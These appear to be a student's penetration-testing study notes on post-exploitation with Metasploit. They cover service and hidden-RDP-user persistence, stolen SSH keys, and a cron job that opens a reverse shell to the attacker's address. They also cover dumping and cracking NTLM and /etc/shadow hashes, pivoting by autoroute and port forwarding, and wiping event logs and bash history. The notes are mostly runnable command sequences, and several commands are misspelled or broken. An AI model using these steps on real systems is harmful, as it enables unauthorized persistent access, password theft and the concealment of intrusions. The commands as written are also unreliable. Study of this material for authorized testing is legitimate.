  

  

## ==_**Persistence**_==

  

### ==Windows Persistence==

  

- _==Persistence Via Services==_

> Persistence consists of techniques that adversaries use to keep access to system across restart , changed credentials, and other interruptions that could cut off their access . ( when we access to system via exploit some services , what we should do to keep connected to the target system ) , in some cases we need a administrator privis .

  

- _Persistence Via Services_
    
    - `nmap -sV -sS -O <target ip>` ⇒ to scan for open ports and what services are running on this port
    - After we exploit the vuln services and get access to target system
    - `search persistence_service` && `use exploit/windows/local/persistence_service`
    
    > so here this module work as this ⇒ it’s generate a payload using msfvenom and upload it on target system then it’s make a background services with administrator privis to give us access when we want
    
    - `set lport 1234` && `set session <session number >` && `run`
    
    > ==after this the msfconsole give us a msfconsole resources file to clean up all we do==
    
    - _==now if we terminate the session and exit from msfconsole==_ ⇒ `reopen msfconsole` && `use multi/handler` && ==**_set up the exactly same option we enter when we set up a_**== `persistence_service` ⇒ we will see we get access to target system without targeting it .
    
      
    
      
    

  

- ==_Persistence Via RDP_==
    
    > here we will set up a Persistence via creating a backdoor user
    
    - `nmap -sV -sS -O <target ip>` ⇒ to scan for open ports and what services are running on this port
    - After we exploit the vuln services and get access to target system
    - `pgerp explorer` && `migrate <process id >`
    - `run getgui -e -u majd -p hacker_123321` ⇒ what done here is first the metepreter ==_will enable RDP if it’s disable_== , then it ==_will add firewall rule on this rdp port if firewall enable_== , then it ==_will add a new user with cred we entered_== , then it ==_will adding this user to administrator group_== , last thing ==_hiding our backdoor user from login screen_== , so when user back to windows login screen our user will not appear .
    
    > ==after this the msfconsole give us a msfconsole resources file to clean up all we do==
    
    - exit the metepreter && exit from msfconsole ⇒ `xfreerdp /u:majd /p:hacker_123321 /v:<target ip>` ⇒ we will open rdp on target system
    
      
    
      
    

  

  

### ==_**Linux Persistence**_==

  

- ==Persistence Via SSH Keys==

> One of the login method we can use to login with SSH is key-based ⇒ so here we don’t need to utilize the username and password to login , u need to have just the private key .

  

- _Persistence Via SSH Keys_
    
    - `nmap -sV -sS -O <target ip>` ⇒ to scan for open ports and what services are running on this port
    - After we exploit the vuln services and get access to target system
    - now the process is simple after we gain access we need to find the ssh dir ⇒ that dir have all user private key , so copy the private key files on your system
    - then when we login we will login like this ⇒ `ssh -i <private-key file > <username>@<target ip>`
    
    > So now if the user change his password we will gain access normally , because we relay on private-key not on the password .
    

  

- ==_Persistence Via Cron Jobs_==

  

> What the image mean we will set up a cron jobs run every min , every hour , every day , every week … etc. ⇒ so that’s mean we will get access to target system when we want

> set up a cron jobs doesn’t matter what type of access u want , if u have a user access not administrator , it’s fine u can do that

  

- _Persistence Via Cron Jobs_
    
    - `nmap -sV -sS -O <target ip>` ⇒ to scan for open ports and what services are running on this port
    - After we exploit the vuln services and get access to target system
    - `cat /etc/cron` ⇒ to see all cron file on target system
    - `echo “* * * * * /bin/bash -c ‘bash -i >& /dev/tcp/<our ip>/<port we will set up the handler on it > 0>&’” > cron` ⇒ so here we create a file called cron , as u can see we set up it to run with 5 * , so it will run always
    - `crontab -i cron` ⇒ that will added our crop file to crontab
    - `nc -nvlp <port we enter on cron job >` ⇒ that will let us access when we want via cron jobs
    
      
    

  

  

## ==_**Dumping & Cracking**_==

  

### ==_**Dumping & Cracking Windows Hashes**_==

  

- ==_Dumping & Cracking NTLM Hashes_==

> Windows stores hashed user account password locally in the SAM (security accounts manager ) database

> Hashing is the process of converting a piece of data into another value

> Authentication and verification of user credentials is facilities by the local security authority (LSA)

> When u use a windows repair utility ⇒ the windows make copy of SAM database and , so this copy need to be deleted manually , so that’s maybe will made u find a copy of SAM database .

> NTLM is a collection of authentication protocols that are utilized in windows of facilitate authentication between computers .

  

- _Dumping & Cracking NTLM Hashes_
    
    - `nmap -sS -sV -O <target ip>` ⇒ To scan open ports and see the running services on this ports
    - After exploit this services and get access of the target system .
    - `pgrep lsas`s ⇒ to copy the lsass process id
    - `migrate <process id >`
    - `hushdump` && `shell`
    - ON our linux ⇒ `vim hashes.txt` && `paste the hashes on it`
    - `john - -format=NT hashes.txt` ⇒ here we use john the ripper to cracking the hashes , using default wordlist of john
    
    > If we want to use wordlist ⇒ `gzip -d /use/share/wordlist/rockyou.txt.gz`
    
    - `john - -format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt` ⇒ here we use john the ripper to cracking the hashes , using rockyou wordlist
    
    > ==_we can use hashcat_==
    
    - `hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt` ⇒ so here we use hashcat with ==-a3 ⇒ which is a type of attack we want (brute-force)== && ==-m <here we need to enter the id of hash we want to crack ( the NTLM hash id is 1000)>==
    
      
    
      
    
      
    

  

  

### _==Dumping & Cracking Linux Hashes==_

  

- ==Dumping & Cracking NTLM Hashes==

> Linux has multi-user support and as a result, multiple users can access the system simultaneously .

> All the information for all accounts on linux is stored in password file ⇒ /etc/passwd

> In linux all password encrypted and the all encrypted password stored in shadow file ⇒ /etc/shadow

> Shadow file ⇒ contain the password hashes and the hash algorithm id ( so we can determine the hash algorithm type by the id )

  

- _Dumping & Cracking NTLM Hashes_
    
    - `nmap -sS -sV -O <target ip>` ⇒ To scan open ports and see the running services on this ports
    - After exploit this services and get access of the target system .
    - `/bin/bash -i` && `cat /etc/passwd` ⇒ to open a bash & cat the password file
    - `cat /etc/shadow` ⇒ we can see the hashes of the users on the systems
    - `session -u 1` ⇒ to upgrade it to metepreter session
    - ==_copy the line value_== && `msfconsole`
    - `search hashdump` && `use post/linux/gather/hashdump` && `set session 2` && `run`
    
    > ==_so here the msfconsole will unshadow the hash and save it in new folder to use it on hash cracking_==
    
    > If we want to use wordlist ⇒ `gzip -d /use/share/wordlist/rockyou.txt.gz`
    
    - `john - -format=<hash type>sha512crypt <path of msfconsole file > - -wordlist=/usr/share/wordlists/rockyou.txt` ⇒ here john the ripper will crack the password
    
    > ==On Hashcat u can see the hash algorithm type id on bottom of help page==
    
    - `hashcat -a3 -m 1800(id of sha512 ) <path of msfconsole file > /usr/share/wordlists/rockyou.txt` ⇒ so here we use hashcat with ==-a3 ⇒ which is a type of attack we want (brute-force)== && ==-m <here we need to enter the id of hash we want to crack ( the sha512 hash id is 1800)>==
    
      
    

  

  

## ==_**Pivoting Lesson**_==

  

- ==_Pivoting_==

> Pivoting ⇒ ==is Post exploitation technique that involves utilizing a compromised host that is connected to multiple network to gain access to system within other network==

> In Other Words it’s technique to go from target host , to another host on same target network we can’t access it directly

> After gaining access to one host , we can use the compromised host to exploit other hosts on private internal network to which we could not access previously

> ==Port Forwarding== ⇒ is the process of redirecting traffic from a specific port on a target system to a specific port on our system

> In the context of pivoting , we can forward a remote port on a previously inaccessible host to a local port on kali linux , so that we can remotely interact/exploit the service running on the port .

> ==So Here we have a victim1 accessible from internet normally , so we get access to victim1 , so another host called victim2 it’s on internal network ( private network ) , so from public internet we can’t access the victim2 because it’s on private ip (private network ) , with Pivoting we will get access to victim1 as usually , then with Pivoting we will explore what host on the same network with victim1 and get access of if , even if it on internal network==

  

- _Pivoting_
    
    - `nmap -sS -sV -O <target ip>` ⇒ To scan open ports and see the running services on this ports
    - After exploit this services and get access of the target system .
    
    > If we know that we have a 2 ip , one of them is private and the other on public internet , ==_if we ping the public one , the response will be usually_== , but ==_if we Ping the internal one , no response will back_==
    
    - `ipconfig` ⇒ see the ip of the target system and see the subnet of it
    - now order to get access to target 2 , we need to add routing to the entire target subnet ⇒ `run autoroute -s <target ip , but last part should be 0 , that’s regarding to subnet mask)/20`
    - `run autoroute -p` ⇒ that will display the active routing table
    
    > What that mean ? ⇒ ==**_we add this routing to the msfconsole , so we now can access or do a scan for any ip on the range of subnet we entered_**==
    
    - `portfwd add -l 1234 -p 80 -r <the ip of internal ip >` ⇒ _so here we forward the port 80 on the internal ip , to port 1234 on our_ [_localhost_](http://localhost) _ip ,_ `==so now when we scan our==` `[==localhost==](http://localhost)` `==ip we will see port 1234 open on our localhost ip ( it’s same 80 , but we forward the port 80 on the internal ip to 1234 on our localhost ip to appear on our scan )==`
    
      
    

  

  

### ==**Clearing Your Tracks**==

  

- ==Clearing Your Tracks On Windows==

> The exploitation and post-exploration phases of penetration test involve actively engaging with target systems

> As a result , you may be required to clean/undo any changes you have made to the target systems you have compromised based on the rules of engagement .

> ==**_A good Practice is to store all your scripts , exploits and binaries in the C://Temp dir on windows && /tmp dir on Linux ._**==

> As we see on MSF , when we use exploitation modules and Post-Exploitation , in some cases MSF tell us it unable to deleted scripts that used on exploit so u need to delete it manual , and it provide u with the path of the file , another cases it’s delete it automatically when u done ⇒ `So pay close attention to the output returns from MSF exploitation & Post modules`

> U should avoided to use a module that clean the windows Event Log , automatically or manually

  

- Clearing Your Tracks On Windows
    
    - `nmap -sS -sV -O <target ip>` ⇒ To scan open ports and see the running services on this ports
    - After exploit this services and get access of the target system .
    - After we transfer the revers shell to target
    - So now we will navigate the root dir ⇒ `C://` && then we need to make a dir called Temp if not appear on root dir ⇒ `mkdir Temp` ⇒ ==so now any files or scan or binaries or any thing we should store it on this Temp file==
    - In some cases when we use a persistence module , we will see the module generate a MSF resources u can use to delete all files and operations the Persistence did ⇒ `resource < path of resource the module generate >`
    - In metepreter , their is a built-in function u can use to clean entire Windows Event Log ⇒ `clearev`
    
      
    

  

  

- ==Clearing Your Tracks On Linux==
    
    - `nmap -sS -sV -O <target ip>` ⇒ To scan open ports and see the running services on this ports
    - After exploit this services and get access of the target system .
    - After we transfer the revers shell to target
    - So now we will navigate the root dir ⇒ `/tmp` ⇒ ==so now any files or scan or binaries or any thing we should store it on this tmp file==
    - `On linux every files on /tmp dir will be deleted once the system is rebooted`
    - In some cases when we use a persistence module , we will see the module generate a MSF resources u can use to delete all files and operations the Persistence did ⇒ `resource < path of resource the module generate >`
    - On most linux system u can found the ==_bash history file_== ⇒ `.bash_history` that file store like as example all commands that run on last week ⇒ so we should pay attention to it and delete the commands we typed it || `history -c` ⇒ to delete it all